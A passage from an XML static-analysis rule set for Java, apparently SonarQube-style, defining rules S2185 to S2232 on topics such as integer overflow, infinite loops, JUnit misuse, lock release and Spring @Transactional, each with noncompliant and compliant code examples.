            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            float twoThirds = 2f/3; // 2 promoted to float. Yields 0.6666667
            long millisInYear = 1_000L*3_600*24*365; // 1000 promoted to long. Yields 31_536_000_000
            long bigNum = Integer.MAX_VALUE + 2L; // 2 promoted to long. Yields 2_147_483_649
            long bigNegNum = Integer.MIN_VALUE-1L; // Yields -2_147_483_649
            Date myDate = new Date(seconds * 1_000L);
            ...
            public long compute(int factor){
            return factor * 10_000L;
            }

            public float compute2(long factor){
            return factor / 123f;
            }
            &lt;/pre&gt;
            &lt;p&gt;or&lt;/p&gt;
            &lt;pre&gt;
            float twoThirds = (float)2/3; // 2 cast to float
            long millisInYear = (long)1_000*3_600*24*365; // 1_000 cast to long
            long bigNum = (long)Integer.MAX_VALUE + 2;
            long bigNegNum = (long)Integer.MIN_VALUE-1;
            Date myDate = new Date((long)seconds * 1_000);
            ...
            public long compute(long factor){
            return factor * 10_000;
            }

            public float compute2(float factor){
            return factor / 123;
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/190&quot;&gt;MITRE, CWE-190&lt;/a&gt; -
            Integer Overflow or Wraparound &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/AjdGBQ&quot;&gt;CERT, NUM50-J.&lt;/a&gt; -
            Convert integers to floating point for floating-point operations
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/I9cxBQ&quot;&gt;CERT, INT18-C.&lt;/a&gt; -
            Evaluate integer expressions in a larger size before comparing or
            assigning to that size &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat2&quot;&gt;SANS Top 25&lt;/a&gt;
            - Risky Resource Management &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>overflow</tag>
        <tag>sans-top25-risky</tag>
        <securityStandards>
            <cwe>190</cwe>
        </securityStandards>
    </rule>

    <rule key='S2185' priority='MAJOR'>
        <configKey>S2185</configKey>
        <name>Silly math should not be performed</name>
        <description>
            &lt;p&gt;Certain math operations are just silly and should not be performed because their results are
            predictable.&lt;/p&gt;
            &lt;p&gt;In particular, &lt;code&gt;anyValue % 1&lt;/code&gt; is silly because it will always return 0.&lt;/p&gt;
            &lt;p&gt;Casting a non-floating-point value to floating-point and then passing it to &lt;code&gt;Math.round&lt;/code&gt;,
            &lt;code&gt;Math.ceil&lt;/code&gt;, or
            &lt;code&gt;Math.floor&lt;/code&gt; is silly because the result will always be the original value. &lt;/p&gt;
            &lt;p&gt;These operations are silly with any constant value: &lt;code&gt;Math.abs&lt;/code&gt;, &lt;code&gt;Math.ceil&lt;/code&gt;,
            &lt;code&gt;Math.floor&lt;/code&gt;, &lt;code&gt;Math.rint&lt;/code&gt;,
            &lt;code&gt;Math.round&lt;/code&gt;.&lt;/p&gt;
            &lt;p&gt;And these oprations are silly with certain constant values:&lt;/p&gt;
            &lt;table&gt;
            &lt;tbody&gt;
            &lt;tr&gt;
            &lt;th&gt;Operation&lt;/th&gt;
            &lt;th&gt;Value&lt;/th&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;acos&lt;/td&gt;
            &lt;td&gt;0.0 or 1.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;asin&lt;/td&gt;
            &lt;td&gt;0.0 or 1.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;atan&lt;/td&gt;
            &lt;td&gt;0.0 or 1.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;atan2&lt;/td&gt;
            &lt;td&gt;0.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;cbrt&lt;/td&gt;
            &lt;td&gt;0.0 or 1.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;cos&lt;/td&gt;
            &lt;td&gt;0.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;cosh&lt;/td&gt;
            &lt;td&gt;0.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;exp&lt;/td&gt;
            &lt;td&gt;0.0 or 1.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;expm1&lt;/td&gt;
            &lt;td&gt;0.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;log&lt;/td&gt;
            &lt;td&gt;0.0 or 1.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;log10&lt;/td&gt;
            &lt;td&gt;0.0 or 1.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;sin&lt;/td&gt;
            &lt;td&gt;0.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;sinh&lt;/td&gt;
            &lt;td&gt;0.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;sqrt&lt;/td&gt;
            &lt;td&gt;0.0 or 1.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;tan&lt;/td&gt;
            &lt;td&gt;0.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;tanh&lt;/td&gt;
            &lt;td&gt;0.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;toDegrees&lt;/td&gt;
            &lt;td&gt;0.0 or 1.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;toRadians&lt;/td&gt;
            &lt;td&gt;0.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;/tbody&gt;
            &lt;/table&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void doMath(int a) {
            double floor = Math.floor((double)a); // Noncompliant
            double ceiling = Math.ceil(4.2); // Noncompliant
            double arcTan = Math.atan(0.0); // Noncompliant
            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S2186' priority='CRITICAL'>
        <configKey>S2186</configKey>
        <name>JUnit assertions should not be used in &quot;run&quot; methods</name>
        <description>
            &lt;p&gt;JUnit assertions should not be made from the &lt;code&gt;run&lt;/code&gt; method of a &lt;code&gt;Runnable&lt;/code&gt;,
            because failed assertions result in
            &lt;code&gt;AssertionError&lt;/code&gt;s being thrown. If the error is thrown from a thread other than the
            one that ran the test, the thread will exit but the
            test won't fail.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void run() {
            // ...
            Assert.assertEquals(expected, actual); // Noncompliant
            }
            &lt;/pre&gt;
        </description>
        <tag>junit</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S2187' priority='BLOCKER'>
        <configKey>S2187</configKey>
        <name>TestCases should contain tests</name>
        <description>
            &lt;p&gt;There's no point in having a JUnit &lt;code&gt;TestCase&lt;/code&gt; without any test methods.
            Similarly, you shouldn't have a file in the tests directory
            named &lt;code&gt;*Test&lt;/code&gt;, &lt;code&gt;*Tests&lt;/code&gt;, or &lt;code&gt;*TestCase&lt;/code&gt;,
            but no tests in the file. Doing either of these things may lead someone to
            think that uncovered classes have been tested.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when files in the test directory are named &lt;code&gt;*Test&lt;/code&gt;,
            &lt;code&gt;*Tests&lt;/code&gt;, or &lt;code&gt;*TestCase&lt;/code&gt; or
            implement &lt;code&gt;TestCase&lt;/code&gt; but don't contain any tests.&lt;/p&gt;
            &lt;p&gt;Supported frameworks:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; JUnit3 &lt;/li&gt;
            &lt;li&gt; JUnit4 &lt;/li&gt;
            &lt;li&gt; JUnit5 &lt;/li&gt;
            &lt;li&gt; TestNG &lt;/li&gt;
            &lt;li&gt; Zohhak &lt;/li&gt;
            &lt;li&gt; ArchUnit &lt;/li&gt;
            &lt;li&gt; Pact &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>confusing</tag>
        <tag>junit</tag>
        <tag>tests</tag>
        <tag>unused</tag>
        <param>
            <key>TestClassNamePattern</key>
            <htmlDesc>Test class name pattern (regular expression)</htmlDesc>
            <defaultValue>.*(Test|Tests|TestCase)</defaultValue>
            <type>STRING</type>
        </param>
    </rule>

    <rule key='S2188' priority='BLOCKER'>
        <configKey>S2188</configKey>
        <name>JUnit test cases should call super methods</name>
        <description>
            &lt;p&gt;Overriding a parent class method prevents that method from being called unless an explicit &lt;code&gt;super&lt;/code&gt;
            call is made in the overriding
            method. In some cases not calling the &lt;code&gt;super&lt;/code&gt; method is acceptable, but not with &lt;code&gt;setUp&lt;/code&gt;
            and &lt;code&gt;tearDown&lt;/code&gt; in a JUnit 3
            &lt;code&gt;TestCase&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClassTest extends MyAbstractTestCase {

            private MyClass myClass;
            @Override
            protected void setUp() throws Exception { // Noncompliant
            myClass = new MyClass();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClassTest extends MyAbstractTestCase {

            private MyClass myClass;
            @Override
            protected void setUp() throws Exception {
            super.setUp();
            myClass = new MyClass();
            }
            &lt;/pre&gt;
        </description>
        <tag>junit</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S2189' priority='BLOCKER'>
        <configKey>S2189</configKey>
        <name>Loops should not be infinite</name>
        <description>
            &lt;p&gt;An infinite loop is one that will never end while the program is running, i.e., you have to kill
            the program to get out of the loop. Whether it is
            by meeting the loop's end condition or via a &lt;code&gt;break&lt;/code&gt;, every loop should have an end
            condition.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            for (;;) { // Noncompliant; end condition omitted
            // ...
            }

            int j;
            while (true) { // Noncompliant; end condition omitted
            j++;
            }

            int k;
            boolean b = true;
            while (b) { // Noncompliant; b never written to in loop
            k++;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            int j;
            while (true) { // reachable end condition added
            j++;
            if (j == Integer.MIN_VALUE) { // true at Integer.MAX_VALUE +1
            break;
            }
            }

            int k;
            boolean b = true;
            while (b) {
            k++;
            b = k &amp;lt; Integer.MAX_VALUE;
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/lzZGBQ&quot;&gt;CERT, MSC01-J.&lt;/a&gt; -
            Do not use an empty infinite loop &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
    </rule>

    <rule key='S2200' priority='MINOR'>
        <configKey>S2200</configKey>
        <name>&quot;compareTo&quot; results should not be checked for specific values</name>
        <description>
            &lt;p&gt;While most &lt;code&gt;compareTo&lt;/code&gt; methods return -1, 0, or 1, some do not, and testing
            the result of a &lt;code&gt;compareTo&lt;/code&gt; against a specific
            value other than 0 could result in false negatives.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if (myClass.compareTo(arg) == -1) { // Noncompliant
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            if (myClass.compareTo(arg) &amp;lt; 0) {
            // ...
            }
            &lt;/pre&gt;
        </description>
        <tag>unpredictable</tag>
    </rule>

    <rule key='S2201' priority='MAJOR'>
        <configKey>S2201</configKey>
        <name>Return values from functions without side effects should not be ignored</name>
        <description>
            &lt;p&gt;When the call to a function doesn't have any side effects, what is the point of making the call if
            the results are ignored? In such case, either
            the function call is useless and should be dropped or the source code doesn't behave as expected.&lt;/p&gt;
            &lt;p&gt;To prevent generating any false-positives, this rule triggers an issue only on the following
            predefined list of immutable classes in the Java API
            :&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;java.lang.String&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.lang.Boolean&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.lang.Integer&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.lang.Double&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.lang.Float&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.lang.Byte&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.lang.Character&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.lang.Short&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.lang.StackTraceElement&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.time.DayOfWeek&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.time.Duration&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.time.Instant&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.time.LocalDate&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.time.LocalDateTime&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.time.LocalTime&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.time.Month&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.time.MonthDay&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.time.OffsetDateTime&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.time.OffsetTime&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.time.Period&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.time.Year&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.time.YearMonth&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.time.ZonedDateTime&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.math.BigInteger&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.math.BigDecimal&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.util.Optional&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;As well as methods of the following classes:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;java.util.Collection&lt;/code&gt;:
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;size()&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;isEmpty()&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;contains(...)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;containsAll(...)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;iterator()&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;toArray()&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.util.Map&lt;/code&gt;:
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;size()&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;isEmpty()&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;containsKey(...)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;containsValue(...)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;get(...)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;getOrDefault(...)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;keySet()&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;entrySet()&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;values()&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void handle(String command){
            command.toLowerCase(); // Noncompliant; result of method thrown away
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void handle(String command){
            String formattedCommand = command.toLowerCase();
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;This rule will not raise an issue when both these conditions are met:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; The method call is in a &lt;code&gt;try&lt;/code&gt; block with an associated &lt;code&gt;catch&lt;/code&gt;
            clause. &lt;/li&gt;
            &lt;li&gt; The method name starts with &quot;parse&quot;, &quot;format&quot;, &quot;decode&quot; or &quot;valueOf&quot;
            or the method is &lt;code&gt;String.getBytes(Charset)&lt;/code&gt;. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            private boolean textIsInteger(String textToCheck) {

            try {
            Integer.parseInt(textToCheck, 10); // OK
            return true;
            } catch (NumberFormatException ignored) {
            return false;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/xzdGBQ&quot;&gt;CERT, EXP00-J.&lt;/a&gt; -
            Do not ignore values returned by methods &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
    </rule>

    <rule key='S2204' priority='MAJOR'>
        <configKey>S2204</configKey>
        <name>&quot;.equals()&quot; should not be used to test the values of &quot;Atomic&quot; classes</name>
        <description>
            &lt;p&gt;&lt;code&gt;AtomicInteger&lt;/code&gt;, and &lt;code&gt;AtomicLong&lt;/code&gt; extend &lt;code&gt;Number&lt;/code&gt;,
            but they're distinct from &lt;code&gt;Integer&lt;/code&gt; and
            &lt;code&gt;Long&lt;/code&gt; and should be handled differently. &lt;code&gt;AtomicInteger&lt;/code&gt; and
            &lt;code&gt;AtomicLong&lt;/code&gt; are designed to support lock-free,
            thread-safe programming on single variables. As such, an &lt;code&gt;AtomicInteger&lt;/code&gt; will only
            ever be &quot;equal&quot; to itself. Instead, you should
            &lt;code&gt;.get()&lt;/code&gt; the value and make comparisons on it.&lt;/p&gt;
            &lt;p&gt;This applies to all the atomic, seeming-primitive wrapper classes: &lt;code&gt;AtomicInteger&lt;/code&gt;,
            &lt;code&gt;AtomicLong&lt;/code&gt;, and
            &lt;code&gt;AtomicBoolean&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            AtomicInteger aInt1 = new AtomicInteger(0);
            AtomicInteger aInt2 = new AtomicInteger(0);

            if (aInt1.equals(aInt2)) { ... } // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            AtomicInteger aInt1 = new AtomicInteger(0);
            AtomicInteger aInt2 = new AtomicInteger(0);

            if (aInt1.get() == aInt2.get()) { ... }
            &lt;/pre&gt;
        </description>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S2209' priority='MAJOR'>
        <configKey>S2209</configKey>
        <name>&quot;static&quot; members should be accessed statically</name>
        <description>
            &lt;p&gt;While it is &lt;em&gt;possible&lt;/em&gt; to access &lt;code&gt;static&lt;/code&gt; members from a
            class instance, it's bad form, and considered by most to be misleading
            because it implies to the readers of your code that there's an instance of the member per class instance.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class A {
            public static int counter = 0;
            }

            public class B {
            private A first = new A();
            private A second = new A();

            public void runUpTheCount() {
            first.counter ++; // Noncompliant
            second.counter ++; // Noncompliant. A.counter is now 2, which is perhaps contrary to expectations
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class A {
            public static int counter = 0;
            }

            public class B {
            private A first = new A();
            private A second = new A();

            public void runUpTheCount() {
            A.counter ++; // Compliant
            A.counter ++; // Compliant
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S2222' priority='CRITICAL'>
        <configKey>S2222</configKey>
        <name>Locks should be released</name>
        <description>
            &lt;p&gt;If a lock is acquired and released within a method, then it must be released along all execution
            paths of that method.&lt;/p&gt;
            &lt;p&gt;Failing to do so will expose the conditional locking logic to the method's callers and hence be
            deadlock-prone.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {
            public void doSomething() {
            Lock lock = new Lock();
            lock.lock(); // Noncompliant
            if (isInitialized()) {
            // ...
            lock.unlock();
            }
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {
            public void doSomething() {
            Lock lock = new Lock();
            if (isInitialized()) {
            lock.lock();
            // ...
            lock.unlock();
            }
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/459.html&quot;&gt;MITRE, CWE-459&lt;/a&gt;
            - Incomplete Cleanup &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S2225' priority='MAJOR'>
        <configKey>S2225</configKey>
        <name>&quot;toString()&quot; and &quot;clone()&quot; methods should not return null</name>
        <description>
            &lt;p&gt;Calling &lt;code&gt;toString()&lt;/code&gt; or &lt;code&gt;clone()&lt;/code&gt; on an object should
            always return a string or an object. Returning &lt;code&gt;null&lt;/code&gt;
            instead contravenes the method's implicit contract.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public String toString () {
            if (this.collection.isEmpty()) {
            return null; // Noncompliant
            } else {
            // ...
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public String toString () {
            if (this.collection.isEmpty()) {
            return &quot;&quot;;
            } else {
            // ...
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/476.html&quot;&gt;MITRE CWE-476&lt;/a&gt;
            - NULL Pointer Dereference &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/aDdGBQ&quot;&gt;CERT, EXP01-J.&lt;/a&gt; -
            Do not use a null in a case where an object is required &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <securityStandards>
            <cwe>476</cwe>
        </securityStandards>
    </rule>

    <rule key='S2226' priority='MAJOR'>
        <configKey>S2226</configKey>
        <name>Servlets should not have mutable instance fields</name>
        <description>
            &lt;p&gt;By contract, a servlet container creates one instance of each servlet and then a dedicated thread
            is attached to each new incoming HTTP request to
            process the request. So all threads share the servlet instances and by extension their instance fields. To
            prevent any misunderstanding and unexpected
            behavior at runtime, all servlet fields should then be either &lt;code&gt;static&lt;/code&gt; and/or &lt;code&gt;final&lt;/code&gt;,
            or simply removed.&lt;/p&gt;
            &lt;p&gt;With Struts 1.X, the same constraint exists on &lt;code&gt;org.apache.struts.action.Action&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyServlet extends HttpServlet {
            private String userName; //As this field is shared by all users, it's obvious that this piece of information
            should be managed differently
            ...
            }
            &lt;/pre&gt;
            &lt;p&gt;or &lt;/p&gt;
            &lt;pre&gt;
            public class MyAction extends Action {
            private String userName; //Same reason
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; Fields annotated with &lt;code&gt;@javax.inject.Inject&lt;/code&gt;, &lt;code&gt;@javax.ejb.EJB&lt;/code&gt;,
            &lt;code&gt;@org.springframework.beans.factory.annotation.Autowired&lt;/code&gt;, &lt;code&gt;@javax.annotation.Resource&lt;/code&gt;
            &lt;/li&gt;
            &lt;li&gt; Fields initialized in &lt;code&gt;init()&lt;/code&gt; or &lt;code&gt;init(ServletConfig config)&lt;/code&gt;
            methods &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/2TZGBQ&quot;&gt;CERT, MSC11-J.&lt;/a&gt; -
            Do not let session information leak within a servlet &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>multi-threading</tag>
        <tag>struts</tag>
    </rule>

    <rule key='S2229' priority='BLOCKER'>
        <configKey>S2229</configKey>
        <name>Methods should not call same-class methods with incompatible &quot;@Transactional&quot; values</name>
        <description>
            &lt;p&gt;When using Spring proxies, calling a method in the same class (e.g. &lt;code&gt;this.aMethod()&lt;/code&gt;)
            with an incompatible &lt;code&gt;@Transactional&lt;/code&gt;
            requirement will result in runtime exceptions because Spring only &quot;sees&quot; the caller and makes no
            provisions for properly invoking the callee. &lt;/p&gt;
            &lt;p&gt;Therefore, certain calls should never be made within the same class:&lt;/p&gt;
            &lt;table&gt;
            &lt;tbody&gt;
            &lt;tr&gt;
            &lt;th&gt;From&lt;/th&gt;
            &lt;th&gt;To&lt;/th&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; non-&lt;code&gt;@Transactional&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; MANDATORY, NESTED, REQUIRED, REQUIRES_NEW &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; MANDATORY &lt;/td&gt;
            &lt;td&gt; NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; NESTED &lt;/td&gt;
            &lt;td&gt; NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; NEVER &lt;/td&gt;
            &lt;td&gt; MANDATORY, NESTED, REQUIRED, REQUIRES_NEW &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; NOT_SUPPORTED &lt;/td&gt;
            &lt;td&gt; MANDATORY, NESTED, REQUIRED, REQUIRES_NEW &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; REQUIRED or &lt;code&gt;@Transactional&lt;/code&gt; &lt;/td&gt;
            &lt;td&gt; NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; REQUIRES_NEW &lt;/td&gt;
            &lt;td&gt; NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; SUPPORTS &lt;/td&gt;
            &lt;td&gt; MANDATORY, NESTED, NEVER, NOT_SUPPORTED, REQUIRED, REQUIRES_NEW &lt;/td&gt;
            &lt;/tr&gt;
            &lt;/tbody&gt;
            &lt;/table&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;

            @Override
            public void doTheThing() {
            // ...
            actuallyDoTheThing(); // Noncompliant
            }

            @Override
            @Transactional
            public void actuallyDoTheThing() {
            // ...
            }
            &lt;/pre&gt;
        </description>
        <tag>spring</tag>
    </rule>

    <rule key='S2230' priority='MAJOR'>
        <configKey>S2230</configKey>
        <name>Non-public methods should not be &quot;@Transactional&quot;</name>
        <description>
            &lt;p&gt;Marking a non-public method &lt;code&gt;@Transactional&lt;/code&gt; is both useless and misleading
            because Spring doesn't &quot;see&quot; non-&lt;code&gt;public&lt;/code&gt;
            methods, and so makes no provision for their proper invocation. Nor does Spring make provision for the
            methods invoked by the method it called.&lt;/p&gt;
            &lt;p&gt;Therefore marking a &lt;code&gt;private&lt;/code&gt; method, for instance, &lt;code&gt;@Transactional&lt;/code&gt;
            can only result in a runtime error or exception if the
            method is actually written to be &lt;code&gt;@Transactional&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @Transactional // Noncompliant
            private void doTheThing(ArgClass arg) {
            // ...
            }
            &lt;/pre&gt;
        </description>
        <tag>spring</tag>
    </rule>

    <rule key='S2232' priority='MAJOR'>
        <configKey>S2232</configKey>
        <name>&quot;ResultSet.isLast()&quot; should not be used</name>
        <description>
            &lt;p&gt;There are several reasons to avoid &lt;code&gt;ResultSet.isLast()&lt;/code&gt;. First, support for
